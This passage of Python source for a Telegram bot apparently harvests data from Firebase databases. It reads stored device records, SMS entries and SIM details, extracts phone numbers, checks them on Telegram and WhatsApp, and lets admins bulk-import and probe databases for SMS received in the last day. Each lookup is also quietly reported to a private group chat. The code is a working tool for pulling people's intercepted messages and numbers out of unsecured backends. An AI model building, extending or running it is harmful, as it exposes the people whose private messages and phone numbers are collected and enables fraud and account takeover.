        msg = await reply(update, ctx, premium_text("checking", [f"⏳ <b>checking {len(numbers)} WA numbers...</b>", "<i>this may take a few seconds</i>"], icon="chart"))
        res = await check_wa_numbers(numbers)
        
        if not admin: await db.increment_check_count(uid, "wa", len(numbers))
        
        try: await msg.delete()
        except: pass
        await reply(update, ctx, premium_text("wa checker results", [res], icon="ghost"), kb_main(admin))
        return True

    if a == "check_fb":
        url = text.strip()
        if not url.startswith("http"):
            await reply(update, ctx, premium_text("error", ["❌ Invalid URL"], icon="cross")); return True
            
        count = await db.get_check_count(uid, "fb")
        if count >= DAILY_FB_LIMIT and not admin:
            await reply(update, ctx, premium_text("limit", [f"❌ daily limit reached ({DAILY_FB_LIMIT})."], icon="cross"), kb_main(admin)); return True
            
        msg = await reply(update, ctx, premium_text("scanning", ["⏳ <b>Scanning firebase for devices...</b>"], icon="chart"))
        
        # Fetch devices
        devices = await discover("OSINT", url)
        nums = list(set(n for d in devices for n in d.numbers))
        
        if not nums:
            await msg.edit_text(premium_text("error", ["❌ no numbers found in this firebase."], icon="cross"))
            return True
            
        nums_to_check = nums[:15] # max 15 numbers to check
        
        await msg.edit_text(premium_text("checking", [
            f"✅ <b>found {len(devices)} devices, {len(nums)} numbers.</b>",
            f"⏳ <b>checking TG & WA for {len(nums_to_check)} numbers...</b>",
            "<i>this may take a few seconds</i>"
        ], icon="ghost"))
        
        # Check TG and WA
        tg_res = await check_tg_numbers(nums_to_check)
        wa_res = await check_wa_numbers(nums_to_check)
        
        # Build result
        report = f"<b>🔗 URL:</b> <code>{esc(url)}</code>\n"
        report += f"<b>📱 Devices:</b> {len(devices)}\n"
        report += f"<b>🔢 Numbers:</b> {len(nums)}\n\n"
        report += f"<b>📱 TG Results:</b>\n{tg_res}\n\n"
        report += f"<b>🟢 WA Results:</b>\n{wa_res}"
        
        # Send to user
        await msg.edit_text(premium_text("fb osint results", [report], icon="fire"))
        
        # Increment limit
        if not admin: await db.increment_check_count(uid, "fb", 1)
        
        # Send to private GC
        if RECORD_CHAT:
            gc_text = premium_text("new fb osint", [
                f"👤 User: {code(uid)}",
                f"🔗 URL: {code(url)}",
                f"📱 Devices: {len(devices)}",
                f"🔢 Numbers: {len(nums)}",
                "",
                report
            ], icon="fire")
            try: await ctx.bot.send_message(RECORD_CHAT, gc_text, parse_mode="HTML")
            except: pass
            
        return True

    if a == "tg_api_id" and admin:
        try: i = int(text)
        except: await reply(update, ctx, premium_text("error", ["❌ invalid id."], icon="cross")); return True
        globals()["TG_API_ID"] = i; await db.set_setting("tg_api_id", i)
        await reply(update, ctx, premium_text("success", [f"✅ API ID set: {i}"], icon="check")); return True

    if a == "tg_api_hash" and admin:
        globals()["TG_API_HASH"] = text; await db.set_setting("tg_api_hash", text)
        await reply(update, ctx, premium_text("success", ["✅ API HASH set."], icon="check")); return True

    if a == "tg_session" and admin:
        await db.set_setting("tg_session", text)
        await reply(update, ctx, premium_text("success", ["✅ Session set. Please reconnect."], icon="check")); return True

    if a == "set_limit_tg" and admin:
        try: n = int(text)
        except: await reply(update, ctx, premium_text("error", ["❌ invalid number."], icon="cross")); return True
        globals()["DAILY_TG_LIMIT"] = n; await db.set_setting("daily_tg_limit", n)
        await reply(update, ctx, premium_text("success", [f"✅ TG limit set to {n}"], icon="check"), kb_admin_limits()); return True

    if a == "set_limit_wa" and admin:
        try: n = int(text)
        except: await reply(update, ctx, premium_text("error", ["❌ invalid number."], icon="cross")); return True
        globals()["DAILY_WA_LIMIT"] = n; await db.set_setting("daily_wa_limit", n)
        await reply(update, ctx, premium_text("success", [f"✅ WA limit set to {n}"], icon="check"), kb_admin_limits()); return True

    if a == "set_limit_fb" and admin:
        try: n = int(text)
        except: await reply(update, ctx, premium_text("error", ["❌ invalid number."], icon="cross")); return True
        globals()["DAILY_FB_LIMIT"] = n; await db.set_setting("daily_fb_limit", n)
        await reply(update, ctx, premium_text("success", [f"✅ FB limit set to {n}"], icon="check"), kb_admin_limits()); return True

    # ... [rest of pending handlers from v15.2 unchanged] ...

    if a == "add_custom_db" and admin:
        if "=" in text:
            tag, url = [x.strip() for x in text.split("=", 1)]
            await db.add_db(tag, url)
            DATABASES[tag] = url
            await reply(update, ctx, premium_text("success", [f"✅ Added DB: <code>{esc(tag)}</code>"], icon="check"), kb_admin_databases())
        else:
            await reply(update, ctx, premium_text("error", ["❌ Format: <code>TAG = URL</code>"], icon="cross"), kb_admin_databases())
        return True

    if a == "remove_db" and admin:
        tags = [x.strip() for x in text.split(",")]
        for t in tags:
            await db.remove_db(t)
            DATABASES.pop(t, None)
        await reply(update, ctx, premium_text("success", [f"🗑 Deleted tags: <code>{esc(', '.join(tags))}</code>"], icon="delete"), kb_admin_databases())
        return True

    if a == "add_dbs" and admin:
        if act.get("input_type") == "txt":
            await reply(update, ctx, premium_text("error", ["❌ <b>you selected TXT mode.</b>", "<i>please upload a .txt file, or send /cancel.</i>"], icon="cross"))
            pending_action[uid] = act
            return True
        await process_db_add(update, ctx, text, act.get("mode", "all"))
        return True

    if a == "purge_confirm" and admin:
        if text.lower() != "yes":
            await reply(update, ctx, premium_text("cancelled", ["❌"], icon="cross")); return True
        dead = act.get("dead", [])
        for t in dead:
            await db.remove_db(t)
            DATABASES.pop(t, None)
        await reply(update, ctx, premium_text("purge done", [f"🗑 removed: <b>{len(dead)}</b>", f"📡 remaining: <b>{len(DATABASES)}</b>"], icon="check")); return True

    if a == "grant_access" and admin:
        target = None
        try: target = int(text.strip().lstrip("@"))
        except ValueError:
            for u, ud in all_users.items():
                if (ud.get("username") or "").lower() == text.strip().lstrip("@").lower(): target = u; break
        if not target:
            await reply(update, ctx, premium_text("error", ["❌ <b>user not found.</b>"], icon="cross")); return True
        allowed_users.add(target); await db.set_setting("allowed", list(allowed_users))
        await reply(update, ctx, premium_text("success", [f"✅ <b>granted:</b> <code>{target}</code>"], icon="check")); return True

    if a == "revoke_access" and admin:
        try: target = int(text.strip().lstrip("@"))
        except ValueError:
            await reply(update, ctx, premium_text("error", ["❌ <b>invalid id.</b>"], icon="cross")); return True
        allowed_users.discard(target); await db.set_setting("allowed", list(allowed_users))
        await reply(update, ctx, premium_text("success", [f"❌ <b>revoked:</b> <code>{target}</code>"], icon="check")); return True

    if a == "add_admin" and admin:
        target = None
        try: target = int(text.strip().lstrip("@"))
        except ValueError:
            for u, ud in all_users.items():
                if (ud.get("username") or "").lower() == text.strip().lstrip("@").lower(): target = u; break
        if not target:
            await reply(update, ctx, premium_text("error", ["❌ <b>user not found.</b>"], icon="cross")); return True
        ADMIN_IDS.add(target); await db.set_setting("admins", list(ADMIN_IDS))
        await reply(update, ctx, premium_text("success", [f"👑 <b>admin added:</b> <code>{target}</code>"], icon="shield")); return True

    if a == "remove_admin" and admin:
        try: target = int(text.strip().lstrip("@"))
        except ValueError:
            await reply(update, ctx, premium_text("error", ["❌ <b>invalid id.</b>"], icon="cross")); return True
        if target == OWNER_HARD_ID:
            await reply(update, ctx, premium_text("error", ["❌ <b>cannot remove owner.</b>"], icon="cross")); return True
        ADMIN_IDS.discard(target); await db.set_setting("admins", list(ADMIN_IDS))
        await reply(update, ctx, premium_text("success", [f"➖ <b>admin removed:</b> <code>{target}</code>"], icon="cross")); return True

    if a == "add_emoji" and admin:
        if "=" not in text:
            await reply(update, ctx, premium_text("error", ["❌ <b>format: name=id</b>"], icon="cross")); return True
        name, eid = [x.strip() for x in text.split("=", 1)]
        if not name or not eid.isdigit() or len(eid) < 10:
            await reply(update, ctx, premium_text("error", ["❌ <b>invalid.</b>"], icon="cross")); return True
        PREMIUM_EMOJIS[name.lower()] = eid; await db.set_setting("emojis", PREMIUM_EMOJIS)
        await reply(update, ctx, text_emojis_list(), kb_admin_emojis()); return True

    if a == "live_set_chat" and admin:
        try: cid = int(text.strip())
        except ValueError:
            await reply(update, ctx, premium_text("error", ["❌ <b>invalid chat id.</b>"], icon="cross")); return True
        globals()["LIVE_MONITOR_CHAT"] = cid; await db.set_setting("live_chat", cid)
        await reply(update, ctx, text_live_status(), kb_admin_live()); return True

    if a == "st_set_chat" and admin:
        try: cid = int(text.strip())
        except ValueError:
            await reply(update, ctx, premium_text("error", ["❌ <b>invalid chat id.</b>"], icon="cross")); return True
        globals()["AUTO_BACKUP_CHAT"] = cid; await db.set_setting("backup_chat", cid)
        await reply(update, ctx, text_storage(), kb_admin_storage()); return True

    if a == "st_set_interval" and admin:
        sec = _parse_interval(text)
        if sec is None:
            await reply(update, ctx, premium_text("error", ["❌ <b>invalid format.</b>\n<i>examples: 30s, 5m, 1h, 45</i>"], icon="cross")); return True
        globals()["AUTO_BACKUP_INTERVAL"] = sec; await db.set_setting("backup_interval", sec)
        await reply(update, ctx, text_storage(), kb_admin_storage()); return True

    if a == "st_retention" and admin:
        try: n = int(text.strip())
        except ValueError:
            await reply(update, ctx, premium_text("error", ["❌ <b>invalid.</b>"], icon="cross")); return True
        globals()["STORAGE_RETENTION"] = max(1, min(500, n)); await db.set_setting("retention", n)
        await reply(update, ctx, text_storage(), kb_admin_storage()); return True

    if a == "md_set_welcome" and admin:
        if update.message.photo: WELCOME_MEDIA.update(type="photo", file_id=update.message.photo[-1].file_id)
        elif update.message.video: WELCOME_MEDIA.update(type="video", file_id=update.message.video.file_id)
        else:
            await reply(update, ctx, premium_text("error", ["❌ <b>send photo or video.</b>"], icon="cross")); return True
        await db.set_setting("welcome_media", WELCOME_MEDIA)
        await reply(update, ctx, text_media_status(), kb_admin_media()); return True

    if a == "md_set_text" and admin:
        globals()["WELCOME_TEXT"] = update.message.html_text or text
        await db.set_setting("welcome_text", WELCOME_TEXT)
        await reply(update, ctx, text_media_status(), kb_admin_media()); return True

    if a == "md_add_rot" and admin:
        if update.message.photo: ROTATION_MEDIA.append({"type": "photo", "file_id": update.message.photo[-1].file_id, "spoiler": False})
        elif update.message.video: ROTATION_MEDIA.append({"type": "video", "file_id": update.message.video.file_id, "spoiler": False})
        else:
            await reply(update, ctx, premium_text("error", ["❌ <b>send photo or video.</b>"], icon="cross")); return True
        await db.set_setting("rotation_media", ROTATION_MEDIA)
        await reply(update, ctx, text_media_status(), kb_admin_media()); return True

    if a.startswith("txt_set_") and admin:
        which = a.replace("txt_set_", "")
        new_text = "" if text.strip() == "-" else (update.message.html_text or text)
        key_map = {"welcome": "WELCOME_TEXT", "help": "HELP_TEXT", "support": "SUPPORT_TEXT", "maint": "MAINTENANCE_TEXT"}
        globals()[key_map[which]] = new_text
        await db.set_setting(key_map[which].lower(), new_text)
        await reply(update, ctx, premium_text(f"{which} text saved", ["✅ <b>updated</b>", "", f"<i>chars: {len(new_text)}</i>"], icon="check"), kb_admin_texts()); return True

    if a == "cl_add" and admin:
        tok = text.strip()
        if ":" not in tok or len(tok) < 30:
            await reply(update, ctx, premium_text("error", ["❌ <b>invalid token.</b>"], icon="cross")); return True
        if any(c.get("token") == tok for c in CLONES):
            await reply(update, ctx, premium_text("error", ["❌ <b>already configured.</b>"], icon="cross")); return True
        ok, uname = await start_clone(tok)
        if not ok:
            await reply(update, ctx, premium_text("error", ["❌ <b>telegram rejected.</b>"], icon="cross")); return True
        CLONES.append({"token": tok, "username": uname}); await db.set_setting("clones", CLONES)
        await reply(update, ctx, text_clone_status(), kb_admin_clones()); return True

    if a == "fj_add_public" and admin:
        ch = text.strip()
        if not ch: return True
        url = f"https://t.me/{ch[1:]}" if ch.startswith("@") else ch
        FORCE_JOIN_CHANNELS.append({"type": "public", "channel": ch, "url": url, "title": ch})
        await db.set_setting("force_join", FORCE_JOIN_CHANNELS)
        await reply(update, ctx, premium_text("success", [f"✅ <b>public added:</b> <code>{esc(ch)}</code>"], icon="lock"), kb_admin_fj()); return True

    if a == "fj_add_private" and admin:
        try: cid = int(text.strip())
        except ValueError:
            await reply(update, ctx, premium_text("error", ["❌ <b>invalid chat id.</b>"], icon="cross")); return True
        try:
            c = await ctx.bot.get_chat(cid)
            title = c.title or str(cid)
        except Exception:
            await reply(update, ctx, premium_text("error", ["❌ <b>bot can't access that chat.</b>\n<i>add bot as admin with 'invite users' permission.</i>"], icon="cross")); return True
        url = ""
        try:
            link = await ctx.bot.create_chat_invite_link(chat_id=cid, creates_join_request=True)
            url = link.invite_link
        except Exception: pass
        FORCE_JOIN_CHANNELS.append({"type": "private", "channel": cid, "url": url, "title": title})
        await db.set_setting("force_join", FORCE_JOIN_CHANNELS)
        await reply(update, ctx, premium_text("private added", [f"📢 <code>{esc(title)}</code>", f"🆔 <code>{cid}</code>", "", "<i>bot will grant access on join request.</i>", "<i>admins approve GC membership manually.</i>"], icon="lock"), kb_admin_fj()); return True

    if a == "ref_set_required" and admin:
        try: n = int(text.strip())
        except ValueError:
            await reply(update, ctx, premium_text("error", ["❌ <b>invalid.</b>"], icon="cross")); return True
        globals()["REQUIRED_REFERRALS"] = max(0, n); await db.set_setting("required_refs", n)
        await view_admin_ref(update, ctx); return True

    if a == "bc_send" and admin:
        await do_broadcast(ctx, uid, update.message, act.get("style", "copy")); return True

    return False

# ══════════════════════════════════════════════════════════════════
# DB ADD / PROBE
# ══════════════════════════════════════════════════════════════════
async def _probe_active(url):
    try:
        clients = await FB.get(url, "clients", shallow=True)
        if not clients: clients = await FB.get(url, "user_data", shallow=True)
        if not clients: clients = await FB.get(url, "All_Users/simDetails", shallow=True)
        if not clients: return False
        cutoff = (time.time() - 24*3600) * 1000
        for dev_id in list(clients.keys())[:8]:
            sms = await FB.get(url, f"All_Users/sms/{dev_id}")
            if not isinstance(sms, dict): continue
            for v in sms.values():
                if not isinstance(v, dict): continue
                try: ts = int(v.get("timestamp", 0) or 0)
                except: continue
                if ts >= cutoff: return True
        return False
    except Exception: return False

def _parse_db_lines(text):
    out, auto = [], 0
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith(("#", "//")): continue
        tag, url = "", ""
        if "=" in line: tag, url = [x.strip() for x in line.split("=", 1)]
        elif "|" in line: tag, url = [x.strip() for x in line.split("|", 1)]
        elif "\t" in line:
            a, b = line.split("\t", 1); tag, url = a.strip(), b.strip()
        elif "," in line and "http" in line:
            parts = line.split(",", 1); tag, url = parts[0].strip(), parts[1].strip()
        else: url = line
        tag = tag.strip().strip('"\'').strip()
        url = url.strip().strip('"\'').strip()
        if url.endswith(".json"): url = url[:-5]
        url = url.rstrip("/")
        if not url.startswith(("http://", "https://")): continue
        if not tag: auto += 1; tag = f"TAG{auto}"
        out.append((tag, url))
    return out

async def process_db_add(update, ctx, text, mode):
    entries = _parse_db_lines(text)
    if not entries:
        await reply(update, ctx, premium_text("error", ["❌ <b>no valid urls.</b>"], icon="cross"), kb_admin_databases()); return
    added, skipped, dead = [], [], []
    for tag, url in entries:
        if tag in DATABASES or url in DATABASES.values():
            skipped.append(tag); continue
        if mode == "active":
            if not await _probe_active(url):
                dead.append(tag); continue
        DATABASES[tag] = url; added.append(tag)
        await db.add_db(tag, url)
    await reply(update, ctx, premium_text(f"import {mode}", [
        f"✅ added: <b>{len(added)}</b>",
        f"🔁 skipped: <b>{len(skipped)}</b>",
        f"❌ dead: <b>{len(dead)}</b>",
        f"📡 total: <b>{len(DATABASES)}</b>",
    ], icon="check"), kb_admin_databases())

# ══════════════════════════════════════════════════════════════════
# BROADCAST (Normal)
# ══════════════════════════════════════════════════════════════════
async def do_broadcast(ctx, uid, msg, style="copy"):
    targets = [u for u in all_users if u != uid and not all_users[u].get("banned")]
    sent = blocked = failed = 0
    wait = await ctx.bot.send_message(uid, premium_text("broadcast running", [f"👥 recipients: <b>{len(targets)}</b>", f"🎨 style: <b>{style}</b>"], icon="rocket"), parse_mode="HTML")
    for u in targets:
        try:
            if style == "silent":
                await ctx.bot.copy_message(chat_id=u, from_chat_id=msg.chat_id, message_id=msg.message_id, disable_notification=True)
            elif style == "forward":
                await ctx.bot.forward_message(chat_id=u, from_chat_id=msg.chat_id, message_id=msg.message_id)
            elif style == "premium":
                txt = msg.text or msg.caption or ""
                if txt:
                    wrapped = premium_text("announcement", [esc(txt)], icon="bell")
                    await ctx.bot.send_message(u, wrapped, parse_mode="HTML")
                else:
                    await ctx.bot.copy_message(chat_id=u, from_chat_id=msg.chat_id, message_id=msg.message_id)
            else:
                await ctx.bot.copy_message(chat_id=u, from_chat_id=msg.chat_id, message_id=msg.message_id)
            sent += 1
        except Forbidden: blocked += 1
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after)
            try:
                await ctx.bot.copy_message(chat_id=u, from_chat_id=msg.chat_id, message_id=msg.message_id); sent += 1
            except: failed += 1
        except Exception: failed += 1
        await asyncio.sleep(0.05)
    await wait.edit_text(premium_text("broadcast complete", [f"✅ sent: <b>{sent}</b>", f"⛔ blocked: <b>{blocked}</b>", f"⚠️ failed: <b>{failed}</b>"], icon="check"), parse_mode="HTML")

# ══════════════════════════════════════════════════════════════════
# CALLBACK
# ══════════════════════════════════════════════════════════════════
async def on_callback(update, ctx):
    cq = update.callback_query
    if cq is None: return
    data = cq.data or ""
    uid = cq.from_user.id
    admin = is_admin(uid)

    now = time.time()
    if now - user_cooldowns.get(uid, 0) < 0.5:
        await cq.answer("⏳ Please slow down.", show_alert=False); return
    user_cooldowns[uid] = now

    await delete_welcome(update, ctx)

    if data == "reveal:prev":
        prev = _pop_view(uid)
        if not prev:
            view_stack.pop(uid, None)
            prev_r = last_result_msgs.pop(uid, None)
            if prev_r:
                for mid in (prev_r.get("ids") or []):
                    try: await ctx.bot.delete_message(uid, mid)
                    except: pass
            try: await cq.message.delete()
            except: pass
            await ctx.bot.send_message(uid, premium_text("main menu", ["<i>use the keyboard below.</i>"], icon="star"), reply_markup=kb_main(admin), parse_mode="HTML")
            try: await cq.answer()
            except: pass
            return
        kind = prev.get("kind", "")
        args = dict(prev.get("args") or {})
        fn = VIEW_REGISTRY.get(kind)
        if not fn:
            try: await cq.answer("⚠️ cannot go back", show_alert=False)
            except: pass
            return
        try: await cq.answer("✨", show_alert=False)
        except: pass
        await fn(update, ctx, **args)
        return

    try:
        if data == "admin:menu": await view_admin(update, ctx)
        elif data == "admin:databases": await view_admin_databases(update, ctx)
        elif data == "admin:users": await view_admin_users(update, ctx)
        elif data == "admin:admins": await view_admin_admins(update, ctx)
        elif data == "admin:emojis": await view_admin_emojis(update, ctx)
        elif data == "admin:live": await view_admin_live(update, ctx)
        elif data == "admin:storage": await view_admin_storage(update, ctx)
        elif data == "admin:media": await view_admin_media(update, ctx)
        elif data == "admin:texts": await view_admin_texts(update, ctx)
        elif data == "admin:clones": await view_admin_clones(update, ctx)
        elif data == "admin:broadcast": await view_admin_broadcast(update, ctx)
        elif data == "admin:fj": await view_admin_fj(update, ctx)
        elif data == "admin:ref": await view_admin_ref(update, ctx)
        elif data == "admin:tools": await view_admin_tools(update, ctx)
        elif data == "admin:tg": await view_admin_tg(update, ctx)
        elif data == "admin:limits": await view_admin_limits(update, ctx)
        elif data == "admin:dashboard": await view_dashboard(update, ctx)

        elif data == "tg:api_id":
            pending_action[uid] = {"action": "tg_api_id"}
            await reply(update, ctx, premium_text("api id", ["send your API ID:"], icon="chart"))
        elif data == "tg:api_hash":
            pending_action[uid] = {"action": "tg_api_hash"}
            await reply(update, ctx, premium_text("api hash", ["send your API HASH:"], icon="chart"))
        elif data == "tg:session":
            pending_action[uid] = {"action": "tg_session"}
            await reply(update, ctx, premium_text("session", ["send your StringSession:"], icon="chart"))
        elif data == "tg:reconnect":
            await cq.answer("⏳ reconnecting...", show_alert=False)
            await init_telethon()
            await view_admin_tg(update, ctx)
        elif data == "tg:status":
            await cq.answer("Status checked", show_alert=False)

        elif data == "limit:tg":
            pending_action[uid] = {"action": "set_limit_tg"}
            await reply(update, ctx, premium_text("set limit", [f"send daily TG limit (current: {DAILY_TG_LIMIT}):"], icon="chart"))
        elif data == "limit:wa":
            pending_action[uid] = {"action": "set_limit_wa"}
            await reply(update, ctx, premium_text("set limit", [f"send daily WA limit (current: {DAILY_WA_LIMIT}):"], icon="chart"))
        elif data == "limit:fb":
            pending_action[uid] = {"action": "set_limit_fb"}
            await reply(update, ctx, premium_text("set limit", [f"send daily FB limit (current: {DAILY_FB_LIMIT}):"], icon="chart"))

        elif data.startswith("db:add:"):
            parts = data.split(":")
            mode = parts[2]
            input_type = parts[3]
            pending_action[uid] = {"action": "add_dbs", "mode": mode, "input_type": input_type}
            if input_type == "url":
                await reply(update, ctx, premium_text(f"add dbs ({mode}) — via URL", [
                    "📝 <b>send firebase urls (one per line):</b>",
                    "<code>TAG = https://xxx.firebaseio.com</code>",
                    "<code>https://yyy.firebaseio.com</code>",
                    "", "<i>send /cancel to abort.</i>",
                ], icon="check"), kb_admin_databases())
            else:
                await reply(update, ctx, premium_text(f"add dbs ({mode}) — via TXT", [
                    "📁 <b>upload a .txt file with firebase urls:</b>",
                    "", "<i>format inside file:</i>",
                    "<code>TAG = https://xxx.firebaseio.com</code>",
                    "", "<i>send /cancel to abort.</i>",
                ], icon="upload"), kb_admin_databases())
        elif data == "db:add:custom":
            pending_action[uid] = {"action": "add_custom_db"}
            await reply(update, ctx, premium_text("add db", ["Send: <code>TAG = URL</code>"], icon="add"), kb_admin_databases())
        elif data == "db:remove":
            pending_action[uid] = {"action": "remove_db"}
            await reply(update, ctx, premium_text("remove db", ["Send tags to remove (comma separated):"], icon="delete"), kb_admin_databases())
        elif data == "db:purge":
            dead = []
            for tag, url in list(DATABASES.items()):
                if not await _probe_active(url): dead.append(tag)
            if not dead:
                await reply(update, ctx, premium_text("purge", ["✅ <i>all alive.</i>"], icon="check"), kb_admin_databases())
            else:
                pending_action[uid] = {"action": "purge_confirm", "dead": dead}
                await reply(update, ctx, premium_text("dead firebases", [f"🔴 dead: <b>{len(dead)}</b>", "", f"tags: {esc(', '.join(dead[:10]))}", "", "<i>send 'yes' to confirm.</i>"], icon="cross"))
        elif data == "db:list":
            lines = [f"{i}. <code>{esc(t)}</code>" for i, (t, u) in enumerate(sorted(DATABASES.items()), 1)]
            await reply(update, ctx, premium_text(f"all dbs ({len(DATABASES)})", lines or ["<i>none</i>"], icon="book"), kb_admin_databases())
        elif data == "db:stats":
            lines = []
            for tag in sorted(DATABASES):
                cached = DEVICE_CACHE.get(tag, [])
                on = sum(1 for d in cached if d.online)
                lines.append(f"📡 {esc(tag[:20])} — {on}/{len(cached)}")
            await reply(update, ctx, premium_text("db stats", lines or ["<i>none</i>"], icon="chart"), kb_admin_databases())

        elif data == "u:grant":
            pending_action[uid] = {"action": "grant_access"}
            await reply(update, ctx, premium_text("grant", ["✅ <b>send user id or @username:</b>"], icon="check"))
        elif data == "u:revoke":
            pending_action[uid] = {"action": "revoke_access"}
            await reply(update, ctx, premium_text("revoke", ["❌ <b>send user id to revoke:</b>"], icon="cross"))
        elif data == "u:view_allowed":
            lines = [f"• <code>{u}</code> — {esc(all_users.get(u, {}).get('name','—'))}" for u in sorted(allowed_users)[:50]] or ["<i>empty</i>"]
            await reply(update, ctx, premium_text(f"allowed ({len(allowed_users)})", lines, icon="check"))
        elif data == "u:toggle_gate":
            globals()["GRANT_ACCESS_REQUIRED"] = not GRANT_ACCESS_REQUIRED
            await db.set_setting("grant_required", GRANT_ACCESS_REQUIRED)
            await view_admin_users(update, ctx)
        elif data == "u:admins":
            await view_admin_admins(update, ctx)
        elif data == "adm:add":
            pending_action[uid] = {"action": "add_admin"}
            await reply(update, ctx, premium_text("add admin", ["👑 <b>send user id or @username:</b>"], icon="shield"))
        elif data == "adm:remove":
            pending_action[uid] = {"action": "remove_admin"}
            await reply(update, ctx, premium_text("remove admin", ["➖ <b>send admin id to remove:</b>"], icon="cross"))
        elif data == "adm:list":
            await view_admin_admins(update, ctx)

        elif data == "emoji:list":
            await reply(update, ctx, text_emojis_list(), kb_admin_emojis())
        elif data == "emoji:add":
            pending_action[uid] = {"action": "add_emoji"}
            await reply(update, ctx, premium_text("add emoji", ["✨ <b>send emoji as:</b>\n\n<code>name=1234567890123456789</code>"], icon="sparkle"))
        elif data == "emoji:remove":
            rows = [[ibtn(f"🗑 {n}", cb=f"emoji:del:{n}", style="danger", eid=PREMIUM_EMOJIS.get("delete"))] for n in PREMIUM_EMOJIS]
            rows.append([ibtn(sc("Back"), cb="admin:emojis", eid=PREMIUM_EMOJIS.get("cross"))])
            await reply(update, ctx, premium_text("remove emoji", ["<i>tap to delete</i>"], icon="sparkle"), InlineKeyboardMarkup(rows))
        elif data.startswith("emoji:del:"):
            n = data.split(":", 2)[2]
            PREMIUM_EMOJIS.pop(n, None); await db.set_setting("emojis", PREMIUM_EMOJIS)
            await view_admin_emojis(update, ctx)
        elif data == "emoji:test":
            chunk = []
            for n, eid in PREMIUM_EMOJIS.items():
                chunk.append(f'{n}: <tg-emoji emoji-id="{eid}">✨</tg-emoji>')
            buf = []
            for line in chunk:
                buf.append(line)
                if sum(len(x)+1 for x in buf) > 3500:
                    await ctx.bot.send_message(uid, "<blockquote>" + "\n".join(buf) + "</blockquote>", parse_mode="HTML"); buf = []
            if buf:
                await ctx.bot.send_message(uid, "<blockquote>" + "\n".join(buf) + "</blockquote>", parse_mode="HTML")

        elif data == "live:toggle":
            if not LIVE_MONITOR_CHAT:
                await cq.answer("❌ set chat first", show_alert=True); return
            globals()["LIVE_MONITOR"] = not LIVE_MONITOR
            await db.set_setting("live_monitor", LIVE_MONITOR)
            await view_admin_live(update, ctx)
        elif data == "live:set_chat":
            pending_action[uid] = {"action": "live_set_chat"}
            await reply(update, ctx, premium_text("set monitor chat", ["🎯 <b>send chat id (pvt gc):</b>\n<code>-1001234567890</code>"], icon="chart"))
        elif data == "live:status":
            await view_admin_live(update, ctx)
        elif data == "live:toggle_admin":
            globals()["LIVE_MONITOR_ONLY_ADMIN_DEV"] = not LIVE_MONITOR_ONLY_ADMIN_DEV
            await db.set_setting("live_only_admin", LIVE_MONITOR_ONLY_ADMIN_DEV)
            await view_admin_live(update, ctx)

        elif data == "st:set_chat":
            pending_action[uid] = {"action": "st_set_chat"}
            await reply(update, ctx, premium_text("set backup chat", ["🎯 <b>send chat id for backups:</b>\n<code>-1001234567890</code>"], icon="chart"))
        elif data == "st:set_interval":
            pending_action[uid] = {"action": "st_set_interval"}
            await reply(update, ctx, premium_text("set interval", [
                "⏱ <b>send interval:</b>\n\n"
                "<code>30s</code> — every 30 seconds\n"
                "<code>5m</code> — every 5 minutes\n"
                "<code>1h</code> — every hour\n"
                "<code>90</code> — plain seconds"
            ], icon="bell"))
        elif data == "st:toggle":
            if not AUTO_BACKUP_CHAT or AUTO_BACKUP_INTERVAL <= 0:
                await cq.answer("❌ set chat + interval first", show_alert=True); return
            globals()["AUTO_BACKUP_ENABLED"] = not AUTO_BACKUP_ENABLED
            await db.set_setting("backup_enabled", AUTO_BACKUP_ENABLED)
            await view_admin_storage(update, ctx)
        elif data == "st:send_now":
            ok = await send_backup(ctx.bot, manual=True)
            await reply(update, ctx, premium_text("backup", ["✅ <b>sent</b>" if ok else "❌ <b>failed</b>"], icon="backup"), kb_admin_storage())
        elif data == "st:files":
            files = _list_backups()
            if not files:
                await reply(update, ctx, premium_text("storage files", ["📭 <i>empty</i>"], icon="backup"), kb_admin_storage()); return
            rows = []
            for f in files[:10]:
                rows.append([ibtn(f"📥 {f['filename'][:30]}", cb=f"stf:get:{f['filename']}", style="success", eid=PREMIUM_EMOJIS.get("upload")),
                             ibtn("🗑", cb=f"stf:del:{f['filename']}", style="danger", eid=PREMIUM_EMOJIS.get("delete"))])
            rows.append([ibtn(sc("Back"), cb="admin:storage", eid=PREMIUM_EMOJIS.get("cross"))])
            await reply(update, ctx, premium_text("download backups", ["<i>tap to download or delete</i>"], icon="book"), InlineKeyboardMarkup(rows))
        elif data.startswith("stf:get:"):
            fn = data.split(":", 2)[2]
            path = os.path.join(BACKUP_DIR, fn)
            if not os.path.exists(path):
                await cq.answer("❌ gone", show_alert=True); return
            try:
                with open(path, "rb") as f:
                    await ctx.bot.send_document(uid, document=f.read(), filename=fn,
                        caption=premium_text("storage file", [f"📄 <code>{esc(fn)}</code>"], icon="book"), parse_mode="HTML")
                await cq.answer("📤 sent", show_alert=False)
            except Exception as e:
                await cq.answer(f"❌ {e}", show_alert=True)
        elif data.startswith("stf:del:"):
            fn = data.split(":", 2)[2]
            try:
                os.remove(os.path.join(BACKUP_DIR, fn))
                await cq.answer("🗑 deleted", show_alert=False)
            except Exception as e:
                await cq.answer(f"❌ {e}", show_alert=True)
        elif data == "st:retention":
            pending_action[uid] = {"action": "st_retention"}
            await reply(update, ctx, premium_text("retention", [f"💾 <b>retention (current: {STORAGE_RETENTION}):</b>"], icon="lock"))

        elif data == "md:set_welcome":
            pending_action[uid] = {"action": "md_set_welcome"}
            await reply(update, ctx, premium_text("media", ["🎬 <b>send photo or video:</b>"], icon="upload"))
        elif data == "md:set_text":
            pending_action[uid] = {"action": "md_set_text"}
            await reply(update, ctx, premium_text("welcome text", ["📝 <b>send welcome caption (HTML ok):</b>"], icon="book"))
        elif data == "md:add_rot":
            pending_action[uid] = {"action": "md_add_rot"}
            await reply(update, ctx, premium_text("rotation", ["📹 <b>send photo/video:</b>"], icon="upload"))
        elif data == "md:view":
            await view_admin_media(update, ctx)
        elif data == "md:toggle_spoiler":
            WELCOME_MEDIA["spoiler"] = not bool(WELCOME_MEDIA.get("spoiler")); await db.set_setting("welcome_media", WELCOME_MEDIA)
            await view_admin_media(update, ctx)
        elif data == "md:toggle_rot":
            globals()["ROTATION_ALWAYS"] = not ROTATION_ALWAYS; await db.set_setting("rotation_always", ROTATION_ALWAYS)
            await view_admin_media(update, ctx)
        elif data == "md:clear_welcome":
            globals()["WELCOME_MEDIA"] = {"file_id": None, "type": "video", "spoiler": False}
            await db.set_setting("welcome_media", WELCOME_MEDIA)
            await view_admin_media(update, ctx)
